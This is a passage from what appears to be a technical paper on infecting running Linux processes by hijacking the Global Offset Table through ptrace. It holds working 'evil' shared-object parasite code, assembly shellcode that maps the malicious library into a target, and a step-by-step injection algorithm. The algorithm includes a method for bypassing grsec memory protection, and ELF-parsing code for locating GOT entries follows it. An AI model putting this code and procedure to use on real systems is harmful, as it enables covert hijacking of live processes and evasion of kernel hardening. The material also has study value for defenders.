the original function.</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/*********************** SHARED OBJECT PARASITE **********************/</span><br>
<br>
<span style="color: #339933;">#include &lt;sys/types.h&gt;</span><br>
<span style="color: #339933;">#include &lt;sys/syscall.h&gt;</span><br>
<br>
<span style="color: #993333;">int</span> evilprint <span style="color: black;">(</span><span style="color: #993333;">char</span> *<span style="color: black;">)</span>;<br>
<br>
<span style="color: #993333;">static</span> <span style="color: #993333;">int</span><br>
_write <span style="color: black;">(</span><span style="color: #993333;">int</span> fd, <span style="color: #993333;">void</span> *buf, <span style="color: #993333;">int</span> count<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; <span style="color: #993333;">long</span> ret;<br>
<br>
&nbsp; __asm__ __volatile__ <span style="color: black;">(</span><span style="color: #ff0000;">"pushl %%ebx<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\t</span>"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"movl %%esi,%%ebx<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\t</span>"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"int $0x80<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\t</span>"</span> <span style="color: #ff0000;">"popl %%ebx"</span>:<span style="color: #ff0000;">"=a"</span> <span style="color: black;">(</span>ret<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; :<span style="color: #ff0000;">"0"</span> <span style="color: black;">(</span>SYS_write<span style="color: black;">)</span>, <span style="color: #ff0000;">"S"</span> <span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">long</span><span style="color: black;">)</span> fd<span style="color: black;">)</span>,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"c"</span> <span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">long</span><span style="color: black;">)</span> buf<span style="color: black;">)</span>, <span style="color: #ff0000;">"d"</span> <span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">long</span><span style="color: black;">)</span> count<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ret &gt;= <span style="color: #cc66cc;">0</span><span style="color: black;">)</span> <span style="color: black;">{</span><br>
&nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: black;">(</span><span style="color: #993333;">int</span><span style="color: black;">)</span> ret;<br>
&nbsp; <span style="color: black;">}</span><br>
&nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">-1</span>;<br>
<span style="color: black;">}</span><br>
<br>
<span style="color: #993333;">int</span><br>
evilprint <span style="color: black;">(</span><span style="color: #993333;">char</span> *buf<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
<br>
<span style="color: #808080; font-style: italic;">/* we must allocate our strings this way on the stack to be PIC */</span><br>
<span style="color: #808080; font-style: italic;">/* otherwise they get stored into .rodata and we can't use them */</span><br>
<br>
&nbsp; <span style="color: #993333;">char</span> new_string<span style="color: black;">[</span><span style="color: #cc66cc;">5</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'e'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'v'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">2</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'i'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'l'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">4</span><span style="color: black;">]</span> = <span style="color: #cc66cc;">0</span>;<br>
<br>
<span style="color: #808080; font-style: italic;">/* we are prepending the word 'evil' to whatever string is on the stack */</span><br>
<br>
&nbsp; _write <span style="color: black;">(</span><span style="color: #cc66cc;">1</span>, new_string, <span style="color: #cc66cc;">5</span><span style="color: black;">)</span>;<br>
&nbsp; _write <span style="color: black;">(</span><span style="color: #cc66cc;">1</span>, buf, <span style="color: #cc66cc;">5</span><span style="color: black;">)</span>;<br>
<br>
&nbsp; <span style="color: #993333;">char</span> newline<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;newline<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'<span style="color: #000099; font-weight: bold;">\n</span>'</span>;<br>
<br>
&nbsp; _write <span style="color: black;">(</span><span style="color: #cc66cc;">1</span>, newline, <span style="color: #cc66cc;">1</span><span style="color: black;">)</span>;<br>
<br>
<span style="color: #808080; font-style: italic;">/* perform the function epilogue, and setup the jump which our */</span><br>
<span style="color: #808080; font-style: italic;">/* hijacker will patch with the right address */</span><br>
<br>
&nbsp; __asm__ __volatile__<br>
&nbsp; &nbsp; <span style="color: black;">(</span><span style="color: #ff0000;">"movl %ebp, %esp<span style="color: #000099; font-weight: bold;">\n</span>"</span> <span style="color: #ff0000;">"pop %ebp<span style="color: #000099; font-weight: bold;">\n</span>"</span> <span style="color: #ff0000;">"movl $0x00000000, %eax<span style="color: #000099; font-weight: bold;">\n</span>"</span> <span style="color: #ff0000;">"jmp *%eax"</span><span style="color: black;">)</span>;<br>
<br>
<span style="color: black;">}</span><br>
<br>
<br>
<span style="color: #993333;">void</span><br>
_init <span style="color: black;">(</span><span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
<span style="color: black;">}</span><br>
<span style="color: #993333;">void</span><br>
_fini <span style="color: black;">(</span><span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>There is definitely room for innovation with the parasite, and 
modifying the arguments is possible by modifying the stack, in which its
 easiest to use a function pointer instead of the jmp. If we wanted our 
parasite to simply modify the string on the stack that puts() takes as 
an argument, our parasite function would look like this instead:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/* parasite that modifies args */</span><br>
<br>
<span style="color: #993333;">int</span><br>
evilprint <span style="color: black;">(</span><span style="color: #993333;">char</span> *buf<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
<br>
&nbsp; <span style="color: #993333;">char</span> new_string<span style="color: black;">[</span><span style="color: #cc66cc;">5</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'e'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'v'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">2</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'i'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'l'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">4</span><span style="color: black;">]</span> = <span style="color: #cc66cc;">0</span>;<br>
<br>
&nbsp; <span style="color: #993333;">int</span> <span style="color: black;">(</span>*origfunc<span style="color: black;">)</span><span style="color: black;">(</span><span style="color: #993333;">char</span> *p<span style="color: black;">)</span> = 0x00000000;<br>
&nbsp; <span style="color: #b1b100;">return</span> origfunc<span style="color: black;">(</span>new_string<span style="color: black;">)</span>;<br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>And our hijacker would need to patch the function pointer with the 
address of the original puts() function. This works like a charm.</p>
<h2><a name="c4"></a>4 - Loading the parasite</h2>
<p>Obviously a process will not execute a library function if the 
library is not loaded into the process address space. Perhaps the 
trickiest part of writing this hijacker was designing the best way to 
get the evil shared object loaded; By the end of writing this paper I 
had two reliable methods of forcing the target process to load your 
shared object, one of which can bypass grsec memory protection for ELF 
segment binary flags.</p>
<p>My initial method was purely proof of concept so that I could simply 
employ my hijacking algorithm without my hijacker having to actually do 
the library loading -- this was to use LD_PRELOAD. This would be stupid 
and pointless since you have to restart the process you want to infect 
after setting the variable so that it loads your lib. That would be no 
good at all, because we want to infect a process ON-THE-FLY.</p>
<p>As mentioned earlier, __libc_dlopen_mode is available in libc and can
 load shared objects, but I did not study it enough to get it working...
 it may need to be initialized first.</p>
<p>The general method I came up with was to simply mmap the library one 
time as rwx for data and text, this method does not handle relocations, 
but is fine if we use a parasite that stays away from dynamic linking.</p>
<h3><a name="c41"></a>4.1 Loading the library the normal way</h3>
<div class="asm" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">_start:<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f;">jmp</span> B<br>
A:<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; # fd = open<span style="color: black;">(</span><span style="color: #7f007f;">"libtest.so.1.0"</span>, O_RDONLY<span style="color: black;">)</span><span style="color: black; font-style: italic;">;</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; xorl %<span style="color: #46aa03; font-weight:bold;">ecx</span>, %<span style="color: #46aa03; font-weight:bold;">ecx</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; movb $<span style="color: #ff0000;">5</span>, %<span style="color: #46aa03; font-weight:bold;">al</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; popl %<span style="color: #46aa03; font-weight:bold;">ebx</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; xorl %<span style="color: #46aa03; font-weight:bold;">ecx</span>, %<span style="color: #46aa03; font-weight:bold;">ecx</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f;">int</span> $0x80<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; subl $<span style="color: #ff0000;">24</span>, %<span style="color: #46aa03; font-weight:bold;">esp</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; # mmap<span style="color: black;">(</span><span style="color: #ff0000;">0</span>, <span style="color: #ff0000;">8192</span>, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED, fd, <span style="color: #ff0000;">0</span><span style="color: black;">)</span><span style="color: black; font-style: italic;">;</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; xorl %<span style="color: #46aa03; font-weight:bold;">edx</span>, %<span style="color: #46aa03; font-weight:bold;">edx</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; movl %<span style="color: #46aa03; font-weight:bold;">edx</span>, <span style="color: black;">(</span>%<span style="color: #46aa03; font-weight:bold;">esp</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; movl $<span style="color: #ff0000;">8192</span>,<span style="color: #ff0000;">4</span><span style="color: black;">(</span>%<span style="color: #46aa03; font-weight:bold;">esp</span><span style="color: black;">)</span> <br>
&nbsp; &nbsp; &nbsp; &nbsp; movl $<span style="color: #ff0000;">7</span>, <span style="color: #ff0000;">8</span><span style="color: black;">(</span>%<span style="color: #46aa03; font-weight:bold;">esp</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; movl $<span style="color: #ff0000;">2</span>, <span style="color: #ff0000;">12</span><span style="color: black;">(</span>%<span style="color: #46aa03; font-weight:bold;">esp</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; movl %<span style="color: #46aa03; font-weight:bold;">eax</span>,<span style="color: #ff0000;">16</span><span style="color: black;">(</span>%<span style="color: #46aa03; font-weight:bold;">esp</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; movl %<span style="color: #46aa03; font-weight:bold;">edx</span>, <span style="color: #ff0000;">20</span><span style="color: black;">(</span>%<span style="color: #46aa03; font-weight:bold;">esp</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; movl $<span style="color: #ff0000;">90</span>, %<span style="color: #46aa03; font-weight:bold;">eax</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; movl %<span style="color: #46aa03; font-weight:bold;">esp</span>, %<span style="color: #46aa03; font-weight:bold;">ebx</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f;">int</span> $0x80<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; # We need <span style="color: #0000ff;">this</span> to transfer control back to our hijacker once<br>
&nbsp; &nbsp; &nbsp; &nbsp; # our shellcode is done executing<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; int3<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; # To get the address of the string dynamically we use <span style="color: #00007f;">call</span>/<span style="color: #00007f;">pop</span> method<br>
B:<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f;">call</span> A<br>
&nbsp; &nbsp; &nbsp; &nbsp; .string <span style="color: #7f007f;">"libtest.so.1.0"</span><br>
&nbsp;</div>
<p>This is simple code that mmap's the evil shared object (which is 
about 5k) into the process address space, we mmap with rwx; usually libc
 is mmap'd into a process several times, once for the text segment (with
 execute) and once for the data segment (with read). In our case we mmap
 the lib only once with rwx (<em>unless we are messing with GRSEC</em>) 
-- but how do we get the process to execute this code? The answer is 
that we must use ptrace to inject the code into the running process, 
then modify the instruction pointer to execute it.</p>
<h3><a name="c42"></a>4.2 Loading the library the Grsec way</h3>
<p>I'd like to give credit to andrewg for conceiving of this idea, which I implemented for the first time (that I've seen).</p>
<p>The grsec kernel patch for Linux has many features, and several of 
them apply to this paper, the primary one being that the text segment is
 marked read/execute only and therefore will not be writeable to inject 
shellcode with ptrace. This is a problem that we overcome using the 
following algorithm.</p>
<ol>
<li>Use PTRACE_SYSCALL to locate sysenter
<p>sysenter is used in modern Linux kernels instead of interrupt 0x80 
because it is much faster. This can be found in the linux-gate marked as
 vdso within the map file of a process. In grsec all of the base 
addresses of memory maps are blank, and there fore getting the address 
from that file is useless. Here is what we are looking for:</p>
<pre class="source">fffe420 &lt;__kernel_vsyscall&gt;:
ffffe420:       51                      push   %ecx
ffffe421:       52                      push   %edx
ffffe422:       55                      push   %ebp
ffffe423:       89 e5                   mov    %esp,%ebp
ffffe425:       0f 34                   sysenter
</pre>
<p>Our goal is to locate the next syscall in the running process, and 
get the eip value. The eip value is most likely going to be several 
bytes past sysenter, so maybe ffffe430.</p></li>
<li>Save the registers right before the syscall is called with sysenter.</li>
<li>Modify %eax with the syscall number of the syscall we want, in our case it is SYS_open.</li>
<li>Modify the args to suite your syscall, and store necessary args into
 the data segment (not the stack). In our case we save the first N bytes
 of the data segment, then write our string "/lib/libtest.so.1.0".</li>
<li>Locate sysenter by reading (reg.eip - 20) into a buffer with ptrace,
 then search through the buffer for the instructions \x0f\x34, so 
sysenter = (reg.eip - 20) + index.</li>
<li>Modify %eip to point at sysenter, and use PTRACE_SINGLESTEP to 
execute the instructions up until sysenter. Repeat steps 3 - 6, but use 
mmap(), then proceed to 7.</li>
<li>Restore data segment</li>
</ol>
<p>The algorithm above is employed in the code provided later on.</p>
<p>It is also worth noting that we could modify the .text memory layout 
using mmap() with MAP_FIXED, and then inject code into the text segment,
 but this modification would be overly apparent in /proc/pid/maps.</p>
<h2><a name="c5"></a>5 - ptrace primer</h2>
<p>Ptrace is an awesome syscall and is used by debuggers like gdb and 
tools like strace to follow and even modify the execution of a program. 
We will be using ptrace for both reading and modifying the process image
 as well as changing the flow of execution for a limited period of time.
 It is important to understand ELF if you want to effectively use ptrace
 -- </p>
<blockquote>
<p>SYNOPSIS</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"> &nbsp; &nbsp; &nbsp; <span style="color: #339933;">#include &lt;sys/ptrace.h&gt;</span><br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #993333;">long</span> ptrace<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">enum</span> __ptrace_request request, pid_t pid,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #993333;">void</span> *addr, <span style="color: #993333;">void</span> *data<span style="color: black;">)</span>;<br>
&nbsp;</div>
</blockquote>
<p>We will be using several specific ptrace requests, and because this 
is not a ptrace tutorial I will give a brief overview of them.</p>
<p>PTRACE_ATTACH - This will attach the calling process to the process 
you want to trace-- thus making the calling process the parent. A 
SIGSTOP is sent to the traced process, so ptrace requests of this type 
should follow with a wait() or waitpid(). We can refer to processes that
 make this request as the 'tracing process'.</p>
<p>PTRACE_PEEKTEXT - This request allows the tracing process to read 
from a virtual memory address within the traced process image -- for 
instance, we could read the entire text segment into a buffer for 
analyzing, or check values in the data segment.</p>
<p>PTRACE_POKTEXT - This request allows the tracing process to modify 
any location within the traced process image, including privately mapped
 shared libraries!</p>
<p>PTRACE_GETREGS - This request allows the tracing process to get a 
copy of the traced processes registers i.e 
eax,ebx,ecx,edx,edi,esi,esp,eip etc.</p>
<p>PTRACE_SETREGS - This request allows the tracing process to set new 
register values for the traced process i.e modify the value of the 
instruction pointer.</p>
<p>PTRACE_CONT - This request says to that the stopped traced process may resume.</p>
<p>PTRACE_DETACH - This request resumes the child process as well, but detaches.</p>
<p>PTRACE SYSCALL - This request restarts the process, but arranges for 
it to stop at the entrance/exit of the next syscall. This allows us to 
inspect the arguments for the syscall, and even modify them.</p>
<p>PTRACE SINGLESTEP - This starts the process, but stops it after the next instruction.</p>
<p>The best way to begin demonstrating ptrace and the ideas so far 
presented is to outline our algorithm for the hijacker and begin to 
implement code for it.</p>
<h2><a name="c6"></a>6 - Hijacker algorithm</h2>
<ol>
<li>Locate binary of target process by parsing /proc/&lt;pid&gt;/maps</li>
<li>Parse PLT to get the desired GOT address</li>
<li>Attach to the process</li>
<li>Find a place to inject our evil .so loader shellcode</li>
</ol>
<p>STEPS 5 - 8 are different for GRSEC patched kernels</p>
<p>NON-GRSEC Method</p>
<ol start="5">
<li>Inject new code, and save original code we are overwriting</li>
<li>Get registers from process, and modify eip (save old eip) to point to our code</li>
<li>Resume traced process so that it executes .so loader shellcode and loads our lib</li>
<li>Reset registers, replace original code, and allow process to resume</li>
</ol>
<p>GRSEC Method</p>
<ol start="5">
<li>Locate sysenter</li>
<li>Save register state</li>
<li>Modify registers and args to call open/mmap</li>
<li>Execute sysenter with our modified args</li>
</ol>
<br>
<ol start="9">
<li>Get base address of our evil library from %eax</li>
<li>Find address of evil function within shared lib by scanning for its code sequence</li>
<li>Retrieve and save value stored in desired GOT address (original function address)</li>
<li>Patch the evil functions transfer-code, with original function address (so it can jmp/call to original)</li>
<li>Overwrite desired GOT address with new value (evil function address)</li>
<li>Detach from process and enjoy</li>
</ol>
<p>Lets go over it more closely...</p>
<h4>Step 1</h4>
<p>So our first step should be to locate the binary that spawned the 
target process; a look into the processes map file looks something like 
this:</p>
<pre class="source">-- /proc/&lt;pid&gt;/map --

08048000-08049000 r-xp 00000000 08:01 5654053    /home/elf/got_hijack/test
08049000-0804a000 rw-p 00000000 08:01 5654053    /home/elf/got_hijack/test
b7e19000-b7e1a000 rw-p b7e19000 00:00 0 
b7e1a000-b7f55000 r-xp 00000000 08:01 9127170    /lib/tls/i686/cmov/libc-2.5.so
b7f55000-b7f56000 r--p 0013b000 08:01 9127170    /lib/tls/i686/cmov/libc-2.5.so
b7f56000-b7f58000 rw-p 0013c000 08:01 9127170    /lib/tls/i686/cmov/libc-2.5.so
b7f58000-b7f5b000 rw-p b7f58000 00:00 0 
b7f65000-b7f68000 rw-p b7f65000 00:00 0 
b7f68000-b7f81000 r-xp 00000000 08:01 9093141    /lib/ld-2.5.so
b7f81000-b7f83000 rw-p 00019000 08:01 9093141    /lib/ld-2.5.so
bff6d000-bff82000 rw-p bffeb000 00:00 0          [stack]
ffffe000-fffff000 r-xp 00000000 00:00 0          [vdso]
</pre>
<p>This file shows us information about the process image, including the
 executable that spawned the process, and the shared libraries that are 
mapped into the process address space. We also see the base address on 
the first line (which is 8048000), might as well grab it while were in 
the file, although we could also get it from the text phdr-&gt;p_vaddr 
just as easily. For ET_DYN files this is a little different, we get the 
base address and then depending on where it gets mmap'd into memory 
calculate the offset to get the real base. The code for parsing this 
file is very simple and not worth showing until the full hijacker is 
documented itself later on in the paper, however it is important to note
 that grsec patched kernels will not show the base addresses in the map 
file and therefore it is imperative to get these elsewhere i.e 
phdr-&gt;p_vaddr.</p>
<h4>Step 2</h4>
<p>Moving onto the second step, this is where we specify the function 
that we want to hijack, then pull its relocation entry so that we can 
get its corresponding GOT address/offset which will hold the address of 
the function we want to hijack. Parsing the executable to get this 
information is sufficient, which is why we must locate it in the 
previous step (although parsing the process image alone will work too). 
The function I wrote to do this will basically pull the information that
 'readelf -r' pulls from an ELF binary.</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/* my custom struct linking_info looks like:<br>
struct linking_info<br>
{<br>
&nbsp; &nbsp; &nbsp; &nbsp; char name[256]; /* symbol name */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> index;&nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/* symbol number */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> count; &nbsp; &nbsp; &nbsp;<span style="color: #808080; font-style: italic;">/* total # of symbols */</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t offset; <span style="color: #808080; font-style: italic;">/* addr/offset into the GOT */</span><br>
<span style="color: black;">}</span>;<br>
*/<br>
<br>
<span style="color: #808080; font-style: italic;">/* unsigned char *mem is a pointer to an mmap of the ELF file */</span><br>
<span style="color: #993333;">struct</span> linking_info * get_plt<span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> *mem<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Ehdr *ehdr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Shdr *shdr, *shdrp, *symshdr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Sym *syms, *symsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Rel *rel;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> *symbol;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> i, j, symcount, k;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">struct</span> linking_info *link;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; ehdr = <span style="color: black;">(</span>Elf32_Ehdr *<span style="color: black;">)</span>mem;<br>
&nbsp; &nbsp; &nbsp; &nbsp; shdr = <span style="color: black;">(</span>Elf32_Shdr *<span style="color: black;">)</span><span style="color: black;">(</span>mem + ehdr-&gt;e_shoff<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; shdrp = shdr;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = ehdr-&gt;e_shnum; i-- &gt; <span style="color: #cc66cc;">0</span>; shdrp++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>shdrp-&gt;sh_type == SHT_DYNSYM<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; symshdr = &amp;shdr<span style="color: black;">[</span>shdrp-&gt;sh_link<span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>symbol = malloc<span style="color: black;">(</span>symshdr-&gt;sh_size<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> fatal;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memcpy<span style="color: black;">(</span>symbol, <span style="color: black;">(</span>mem + symshdr-&gt;sh_offset<span style="color: black;">)</span>, symshdr-&gt;sh_size<span style="color: black;">)</span>;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>syms = <span style="color: black;">(</span>Elf32_Sym *<span style="color: black;">)</span>malloc<span style="color: black;">(</span>shdrp-&gt;sh_size<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> fatal;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memcpy<span style="color: black;">(</span><span style="color: black;">(</span>Elf32_Sym *<span style="color: black;">)</span>syms, <span style="color: black;">(</span>Elf32_Sym *<span style="color: black;">)</span><span style="color: black;">(</span>mem + shdrp-&gt;sh_offset<span style="color: black;">)</span>, shdrp-&gt;sh_size<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; symsp = syms;<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; symcount = <span style="color: black;">(</span>shdrp-&gt;sh_size / <span style="color: #993333;">sizeof</span><span style="color: black;">(</span>Elf32_Sym<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; link = <span style="color: black;">(</span><span style="color: #993333;">struct</span> linking_info *<span style="color: black;">)</span>malloc<span style="color: black;">(</span><span style="color: #993333;">sizeof</span><span style="color: black;">(</span><span style="color: #993333;">struct</span> linking_info<span style="color: black;">)</span> * symcount<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>!link<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> fatal;<br>
&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; link<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span>.<span style="color: #202020;">count</span> = symcount;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">(</span>j = <span style="color: #cc66cc;">0</span>; j &lt; symcount; j++, symsp++<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
